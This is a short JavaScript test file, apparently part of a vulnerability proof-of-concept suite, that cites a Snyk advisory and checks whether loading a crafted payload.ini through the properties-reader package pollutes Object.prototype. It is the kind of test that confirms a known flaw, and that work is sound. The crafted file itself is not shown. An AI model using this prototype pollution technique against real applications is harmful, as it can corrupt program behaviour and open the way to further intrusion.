//https://snyk.io/vuln/SNYK-JS-PROPERTIESREADER-1048968
test("prototype pollution in properties-reader", () => {
  const propertiesReader = require("properties-reader");
  const path = require("path");

  expect({}.polluted).toBe(undefined);

  propertiesReader(path.resolve(__dirname, "./payload.ini"));
  expect({}.polluted).toBe("yes");
});
